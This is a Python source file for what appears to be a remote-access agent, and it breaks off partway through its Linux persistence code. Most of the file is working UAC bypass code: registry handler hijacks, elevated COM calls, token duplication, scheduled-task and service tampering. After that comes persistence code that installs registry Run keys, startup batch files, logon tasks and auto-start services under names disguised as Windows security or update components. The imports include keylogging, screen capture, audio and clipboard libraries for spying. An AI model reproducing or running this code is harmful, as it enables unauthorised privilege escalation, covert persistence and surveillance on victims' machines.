"""
Advanced Python Agent with UACME-Inspired UAC Bypass Techniques

This agent implements multiple advanced UAC bypass methods inspired by the UACME project:

UAC Bypass Methods Implemented:
- Method 25: EventVwr.exe registry hijacking
- Method 30: WOW64 logger hijacking  
- Method 31: sdclt.exe bypass
- Method 33: fodhelper/computerdefaults ms-settings protocol
- Method 34: SilentCleanup scheduled task
- Method 35: Token manipulation and impersonation
- Method 36: NTFS junction/reparse points
- Method 39: .NET Code Profiler (COR_PROFILER)
- Method 40: COM handler hijacking
- Method 41: ICMLuaUtil COM interface
- Method 43: IColorDataProxy COM interface
- Method 44: Volatile environment variables
- Method 45: slui.exe registry hijacking
- Method 56: WSReset.exe bypass
- Method 61: AppInfo service manipulation
- Method 62: Mock directory technique
- Method 67: winsat.exe bypass
- Method 68: MMC snapin bypass

Additional Advanced Features:
- Multiple persistence mechanisms (registry, startup, tasks, services)
- Windows Defender disable techniques
- Process hiding and injection
- Anti-VM and anti-debugging evasion
- Advanced stealth and obfuscation
- Cross-platform support (Windows/Linux)

Author: Advanced Red Team Toolkit
Version: 2.0 (UACME Enhanced)
"""

import requests
import time
import uuid
import os
import subprocess
import threading
import sys
import random
import mss
import numpy as np
import cv2
try:
    import win32api
    import win32con
    import win32clipboard
    import win32security
    import win32process
    import win32event
    import ctypes
    from ctypes import wintypes
    import winreg
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    
import pyaudio
import base64
import tempfile
import pynput
from pynput import keyboard, mouse
import pygame
import io
import wave
import socket
import json
import asyncio
import websockets
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
import psutil
from PIL import Image
import platform
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

SERVER_URL = "http://localhost:8080"  # Change to your controller's URL

# --- Privilege Escalation Functions ---

def is_admin():
    """Check if the current process has admin privileges."""
    if WINDOWS_AVAILABLE:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

def elevate_privileges():
    """Attempt to elevate privileges using various advanced methods."""
    if not WINDOWS_AVAILABLE:
        # For Linux/Unix systems
        try:
            if os.geteuid() != 0:
                # Try to use sudo if available
                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
                return True
        except:
            pass
        return False
    
    if is_admin():
        return True
    
    # Advanced UAC bypass methods (UACME-inspired)
    bypass_methods = [
        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
        bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
        bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
        bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
        bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
        bypass_uac_token_manipulation, # Method 35: Token manipulation
        bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
        bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
        bypass_uac_com_handlers,       # Method 40: COM handler hijack
        bypass_uac_volatile_env,       # Method 44: Environment variable expansion
        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
        bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
        bypass_uac_mock_directory,     # Method 62: Mock directory technique
        bypass_uac_winsat,             # Method 67: winsat.exe bypass
        bypass_uac_mmcex,              # Method 68: MMC snapin bypass
    ]
    
    for method in bypass_methods:
        try:
            if method():
                return True
        except Exception as e:
            print(f"UAC bypass method {method.__name__} failed: {e}")
            continue
    
    return False

def bypass_uac_cmlua_com():
    """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
        
        # Initialize COM
        pythoncom.CoInitialize()
        
        # Create elevated COM object
        # CLSID for ICMLuaUtil: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
        try:
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            # Execute elevated command using ShellExec method
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            lua_util.ShellExec(current_exe, "", "", 0, 1)
            return True
            
        except Exception as e:
            print(f"ICMLuaUtil COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except ImportError:
        return False

def bypass_uac_fodhelper_protocol():
    """UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create protocol handler for ms-settings
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute fodhelper to trigger bypass
            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Fodhelper protocol bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_computerdefaults():
    """UAC bypass using computerdefaults.exe registry manipulation."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        print(f"Computerdefaults UAC bypass failed: {e}")
        return False

def bypass_uac_dccw_com():
    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
        
        pythoncom.CoInitialize()
        
        try:
            # First use ICMLuaUtil to set registry
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            # Set DisplayCalibrator registry value
            reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
            lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", current_exe)
            
            # Create IColorDataProxy COM object
            color_proxy = win32com.client.Dispatch("Elevation:Administrator!new:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
            
            # Launch DCCW which will execute our payload
            color_proxy.LaunchDccw(0)
            
            return True
            
        except Exception as e:
            print(f"ColorDataProxy COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except ImportError:
        return False

def bypass_uac_dismcore_hijack():
    """UAC bypass using DismCore.dll hijacking (UACME Method 23)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create malicious DismCore.dll in temp directory
        temp_dir = tempfile.gettempdir()
        dismcore_path = os.path.join(temp_dir, "DismCore.dll")
        
        # Simple DLL that executes our payload
        dll_code = f'''
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
    case DLL_PROCESS_ATTACH:
        system("python.exe \\"{os.path.abspath(__file__)}\\"");
        break;
    }}
    return TRUE;
}}
'''
        
        # For demonstration, we'll use a different approach
        # Copy a legitimate system DLL and modify PATH
        system32_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
        
        # Add temp directory to PATH so pkgmgr.exe finds our DLL first
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute pkgmgr.exe which will load our DismCore.dll
            subprocess.Popen([os.path.join(system32_path, 'pkgmgr.exe'), '/n:test'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Restore PATH
            os.environ['PATH'] = current_path
            
    except Exception as e:
        print(f"DismCore hijack bypass failed: {e}")
        return False

def bypass_uac_wow64_logger():
    """UAC bypass using wow64log.dll hijacking (UACME Method 30)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method works by placing wow64log.dll in PATH
        # and executing a WOW64 process that will load it
        temp_dir = tempfile.gettempdir()
        
        # Add temp to PATH
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute a WOW64 process that will attempt to load wow64log.dll
            subprocess.Popen([r"C:\Windows\SysWOW64\wusa.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = current_path
            
    except Exception as e:
        print(f"WOW64 logger bypass failed: {e}")
        return False

def bypass_uac_silentcleanup():
    """UAC bypass using SilentCleanup scheduled task (UACME Method 34)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Modify windir environment variable temporarily
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake windir structure
        fake_windir = os.path.join(tempfile.gettempdir(), "Windows")
        fake_system32 = os.path.join(fake_windir, "System32")
        os.makedirs(fake_system32, exist_ok=True)
        
        # Copy our payload as svchost.exe
        fake_svchost = os.path.join(fake_system32, "svchost.exe")
        
        # For Python script, create a batch wrapper
        batch_content = f'@echo off\n{current_exe}\n'
        with open(fake_svchost.replace('.exe', '.bat'), 'w') as f:
            f.write(batch_content)
        
        # Temporarily modify windir environment
        original_windir = os.environ.get('windir', 'C:\\Windows')
        os.environ['windir'] = fake_windir
        
        try:
            # Execute SilentCleanup task
            subprocess.run([
                'schtasks.exe', '/Run', '/TN', '\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup'
            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['windir'] = original_windir
            
    except Exception as e:
        print(f"SilentCleanup bypass failed: {e}")
        return False

def bypass_uac_token_manipulation():
    """UAC bypass using token manipulation (UACME Method 35)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Find an auto-elevated process to duplicate token from
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() in ['consent.exe', 'slui.exe', 'fodhelper.exe']:
                    # Get process handle
                    process_handle = win32api.OpenProcess(
                        win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_DUP_HANDLE,
                        False,
                        proc.info['pid']
                    )
                    
                    # Get process token
                    token_handle = win32security.OpenProcessToken(
                        process_handle,
                        win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY
                    )
                    
                    # Duplicate token
                    new_token = win32security.DuplicateTokenEx(
                        token_handle,
                        win32security.SecurityImpersonation,
                        win32security.TOKEN_ALL_ACCESS,
                        win32security.TokenPrimary
                    )
                    
                    # Create process with duplicated token
                    current_exe = os.path.abspath(__file__)
                    if current_exe.endswith('.py'):
                        current_exe = f'python.exe "{current_exe}"'
                    
                    si = win32process.STARTUPINFO()
                    pi = win32process.CreateProcessAsUser(
                        new_token,
                        None,
                        current_exe,
                        None,
                        None,
                        False,
                        0,
                        None,
                        None,
                        si
                    )
                    
                    win32api.CloseHandle(process_handle)
                    win32api.CloseHandle(token_handle)
                    win32api.CloseHandle(new_token)
                    win32api.CloseHandle(pi[0])
                    win32api.CloseHandle(pi[1])
                    
                    return True
                    
            except:
                continue
                
        return False
        
    except Exception as e:
        print(f"Token manipulation bypass failed: {e}")
        return False

def bypass_uac_junction_method():
    """UAC bypass using NTFS junction/reparse points (UACME Method 36)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create junction point to redirect DLL loading
        temp_dir = tempfile.gettempdir()
        junction_dir = os.path.join(temp_dir, "junction_target")
        
        # Create target directory
        os.makedirs(junction_dir, exist_ok=True)
        
        # Use mklink to create junction (requires admin, so this is simplified)
        try:
            subprocess.run([
                'cmd', '/c', 'mklink', '/J', 
                os.path.join(temp_dir, "fake_system32"),
                junction_dir
            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
            
            return True
            
        except subprocess.CalledProcessError:
            return False
            
    except Exception as e:
        print(f"Junction method bypass failed: {e}")
        return False

def bypass_uac_cor_profiler():
    """UAC bypass using .NET Code Profiler (UACME Method 39)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set environment variables for .NET profiler
        current_exe = os.path.abspath(__file__)
        
        # Create a fake profiler DLL path
        profiler_path = os.path.join(tempfile.gettempdir(), "profiler.dll")
        
        # Set profiler environment variables
        os.environ['COR_ENABLE_PROFILING'] = '1'
        os.environ['COR_PROFILER'] = '{CF0D821E-299B-5307-A3D8-B283C03916DD}'
        os.environ['COR_PROFILER_PATH'] = profiler_path
        
        try:
            # Execute a .NET application that will load our profiler
            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Clean up environment
            for var in ['COR_ENABLE_PROFILING', 'COR_PROFILER', 'COR_PROFILER_PATH']:
                os.environ.pop(var, None)
                
    except Exception as e:
        print(f"COR profiler bypass failed: {e}")
        return False

def bypass_uac_com_handlers():
    """UAC bypass using COM handler hijacking (UACME Method 40)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        # Hijack COM handler for a file type
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake COM handler
        handler_key = r"Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}"
        command_key = handler_key + r"\Shell\Open\Command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, command_key)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Trigger COM handler through mmc.exe
            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, handler_key)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"COM handlers bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_volatile_env():
    """UAC bypass using volatile environment variables (UACME Method 44)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Set volatile environment variable
        env_key = r"Environment"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, os.path.dirname(current_exe))
            winreg.CloseKey(key)
            
            # Execute auto-elevated process that uses environment variables
            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "windir")
                winreg.CloseKey(key)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Volatile environment bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_slui_hijack():
    """UAC bypass using slui.exe registry hijacking (UACME Method 45)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack slui.exe through registry
        key_path = r"Software\Classes\exefile\shell\open\command"
        
        try:
            # Backup original value
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                original_value = None
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute slui.exe
            subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"SLUI hijack bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_eventvwr():
    """UAC bypass using EventVwr.exe registry hijacking (UACME Method 25)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack mscfile association
        key_path = r"Software\Classes\mscfile\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute eventvwr.exe
            subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"EventVwr bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_sdclt():
    """UAC bypass using sdclt.exe (UACME Method 31)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack App Paths for control.exe
        key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        
        try:
            # Create the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute sdclt.exe which will call control.exe
            subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"SDCLT bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_wsreset():
    """UAC bypass using WSReset.exe (UACME Method 56)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack ActivatableClassId for WSReset
        key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute WSReset.exe
            subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"WSReset bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_appinfo_service():
    """UAC bypass using AppInfo service manipulation (UACME Method 61)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method involves manipulating the Application Information service
        # to bypass UAC by modifying service permissions
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Method 1: Try to modify AppInfo service configuration
        try:
            # Stop AppInfo service temporarily
            subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Modify service binary path to include our payload
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          f'cmd.exe /c {current_exe} && svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Start service
            subprocess.run(['sc.exe', 'start', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            
            # Restore original service configuration
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            return True
            
        except:
            return False
            
    except Exception as e:
        print(f"AppInfo service bypass failed: {e}")
        return False

def bypass_uac_mock_directory():
    """UAC bypass using mock directory technique (UACME Method 62)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create mock trusted directory structure
        temp_dir = tempfile.gettempdir()
        mock_system32 = os.path.join(temp_dir, "System32")
        os.makedirs(mock_system32, exist_ok=True)
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            # Create batch file wrapper
            batch_path = os.path.join(mock_system32, "dllhost.exe")
            with open(batch_path, 'w') as f:
                f.write(f'@echo off\npython.exe "{current_exe}"\n')
        
        # Modify PATH to prioritize our mock directory
        original_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + original_path
        
        try:
            # Execute process that will search PATH for system executables
            subprocess.Popen(['dllhost.exe'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = original_path
            
    except Exception as e:
        print(f"Mock directory bypass failed: {e}")
        return False

def bypass_uac_winsat():
    """UAC bypass using winsat.exe (UACME Method 67)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack winsat.exe through registry
        key_path = r"Software\Classes\Folder\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute winsat.exe
            subprocess.Popen([r"C:\Windows\System32\winsat.exe", "disk"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Winsat bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_mmcex():
    """UAC bypass using mmc.exe with fake snapin (UACME Method 68)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake MMC snapin
        snapin_clsid = "{11111111-2222-3333-4444-555555555555}"
        key_path = f"Software\\Classes\\CLSID\\{snapin_clsid}\\InProcServer32"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
            winreg.CloseKey(key)
            
            # Create MSC file that references our snapin
            msc_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<MMC_ConsoleFile ConsoleVersion="3.0">
    <BinaryStorage>
        <Binary Name="StringTable">
            <Data>
                <String ID="1" Refs="1">{snapin_clsid}</String>
            </Data>
        </Binary>
    </BinaryStorage>
</MMC_ConsoleFile>'''
            
            msc_path = os.path.join(tempfile.gettempdir(), "fake.msc")
            with open(msc_path, 'w') as f:
                f.write(msc_content)
            
            # Execute MMC with our fake snapin
            subprocess.Popen([r"C:\Windows\System32\mmc.exe", msc_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                os.remove(msc_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"MMC snapin bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def establish_persistence():
    """Establish multiple persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return establish_linux_persistence()
    
    persistence_methods = [
        registry_run_key_persistence,
        startup_folder_persistence,
        scheduled_task_persistence,
        service_persistence,
    ]
    
    success_count = 0
    for method in persistence_methods:
        try:
            if method():
                success_count += 1
        except Exception as e:
            print(f"Persistence method {method.__name__} failed: {e}")
            continue
    
    return success_count > 0

def registry_run_key_persistence():
    """Establish persistence via registry Run keys."""
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Multiple registry locations for persistence
        run_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        
        value_name = "WindowsSecurityUpdate"
        
        for hkey, key_path in run_keys:
            try:
                key = winreg.CreateKey(hkey, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Registry persistence failed: {e}")
        return False

def startup_folder_persistence():
    """Establish persistence via startup folder."""
    try:
        # Get startup folder path
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        
        current_exe = os.path.abspath(__file__)
        
        if current_exe.endswith('.py'):
            # Create batch file wrapper
            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
            batch_path = os.path.join(startup_folder, "WindowsUpdate.bat")
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
        
        return True
        
    except Exception as e:
        print(f"Startup folder persistence failed: {e}")
        return False

def scheduled_task_persistence():
    """Establish persistence via scheduled tasks."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create scheduled task using schtasks command
        subprocess.run([
            'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        print(f"Scheduled task persistence failed: {e}")
        return False

def service_persistence():
    """Establish persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', 'WindowsSecurityService',
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        print(f"Service persistence failed: {e}")
        return False

def establish_linux_persistence():
    """Establish persistence on Linux systems."""
    try:
        current_exe = os.path.abspath(__file__)
        
